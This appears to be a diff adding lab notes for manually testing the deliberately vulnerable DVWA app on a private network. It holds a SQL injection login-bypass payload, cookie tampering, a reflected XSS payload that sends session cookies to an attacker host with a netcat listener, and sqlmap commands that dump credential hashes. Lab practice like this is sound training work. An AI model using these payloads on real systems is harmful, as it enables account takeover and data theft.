@@ -1,0 +1,32 @@
+Burp Suite Manual Testing Steps
+1. SQL Injection (Login Bypass)
+text
+# Proxy → Intercept ON → DVWA Login
+POST /login.php HTTP/1.1
+username=admin' OR 1=1 --&password=test&Login=Login
+
+# Response: Welcome admin (bypassed)
+2. Session Token Theft
+text
+# Proxy → Intercept → DVWA SQLi page
+GET /vulnerabilities/sqli/?id=1&Submit=Submit
+Cookie: PHPSESSID=abc123; security=low
+
+# Repeater → Change to: security=impossible
+# Result: Blocks advanced payloads → security=low bypass
+3. XSS Reflected (Form)
+text
+# Target: http://192.168.1.200/vulnerabilities/xss_r/
+Input: <script>document.location='http://192.168.1.50:8000/?cookie='+document.cookie</script>
+# Kali: nc -lvnp 8000 → Captures session cookies
+sqlmap Commands (Automated)
+bash
+# Login form SQLi
+sqlmap -u "http://192.168.1.200/login.php" --forms --batch --dbs
+
+# DVWA SQLi page
+sqlmap -u "http://192.168.1.200/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="security=low; PHPSESSID=xyz" --dump --batch
+
+# Output: admin:5f4dcc3b5aa765d61d8327deb882cf99 (password)
+
